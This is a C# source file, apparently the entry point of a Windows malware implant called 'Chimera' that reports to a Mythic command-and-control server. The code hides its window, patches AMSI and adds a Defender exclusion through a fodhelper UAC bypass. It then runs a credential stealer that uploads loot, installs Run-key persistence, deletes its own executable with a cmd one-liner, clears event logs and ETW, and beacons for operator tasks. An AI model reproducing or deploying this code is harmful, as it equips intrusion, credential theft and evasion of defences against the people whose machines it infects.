using System;
using System.Threading;

namespace Chimera
{
    // WinExe target — no console window
    static class Program
    {
        // STAThread required for Clipboard and some Windows API calls
        [System.STAThread]
        static void Main(string[] args)
        {
            // Hide console window if somehow spawned with one
            var handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
                ShowWindow(handle, 0); // SW_HIDE

            // AMSI bypass — patch amsi.dll!AmsiScanBuffer so this process is invisible to runtime scanning
            Commands.AmsiBypass.Apply();

            // Random seed for jitter
            var rng = new Random();

            // -------------------------------------------------------
            // Phase 1: Check in with Mythic
            // Retry checkin up to 5 times before giving up
            // -------------------------------------------------------
            string checkinResponse = null;
            for (int attempt = 0; attempt < 5; attempt++)
            {
                checkinResponse = C2Http.CheckIn();
                if (checkinResponse != null && Tasking.ParseCheckinResponse(checkinResponse))
                    break;

                // Wait before retry with jitter
                Thread.Sleep(5000 + rng.Next(0, 3000));
            }

            // If checkin failed all retries, exit silently
            if (string.IsNullOrEmpty(Tasking.CallbackUUID))
                return;

            // -------------------------------------------------------
            // Phase 2: Auto startup — run once immediately after checkin
            // Runs stealer, installs persistence, clears logs before
            // entering the beacon loop so operator sees loot right away
            // -------------------------------------------------------
            string startupTaskID = "startup-" + Guid.NewGuid().ToString("N").Substring(0, 8);
            try
            {
                // 2a. Add C:\Users\Public to Defender exclusions via fodhelper UAC bypass.
                //     Must run BEFORE stealer or persist write agent.dat to that path.
                Commands.DefenderExclusion.Execute();
            }
            catch { }

            // Brief pause so the exclusion registry entry propagates before Defender
            // scans anything we write under C:\Users\Public
            System.Threading.Thread.Sleep(3500);

            try
            {
                // 2b. Run stealer and upload loot
                Commands.StealerExfil.Execute(startupTaskID, Tasking.CallbackUUID);
            }
            catch { /* non-fatal — carry on */ }

            try
            {
                // 2c. Install HKCU persistence (writes agent.dat + Run key)
                Commands.Persist.Execute();
            }
            catch { }

            try
            {
                // 2d. Self-delete exe from disk — agent.dat handles restarts,
                //     no PE file left on disk for Defender to scan
                string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
                if (!string.IsNullOrEmpty(self) && System.IO.File.Exists(self))
                {
                    // Use cmd /c to delete after process releases the handle
                    Commands.Shell.Execute("cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + self + "\"");
                }
            }
            catch { }

            try
            {
                // 2e. Clear event logs / ETW / WER
                Commands.ClearLogs.Execute();
            }
            catch { }

            // -------------------------------------------------------
            // Phase 3: Beacon loop
            // -------------------------------------------------------
            while (true)
            {
                try
                {
                    string taskingResponse = C2Http.GetTasking(Tasking.CallbackUUID);
                    if (taskingResponse != null)
                        Tasking.Dispatch(taskingResponse);
                }
                catch
                {
                    // Swallow errors — never crash
                }

                // Sleep via C2Http.Sleep() — respects runtime c2config jitter overrides
                C2Http.Sleep();
            }
        }

        // P/Invoke to hide console window
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
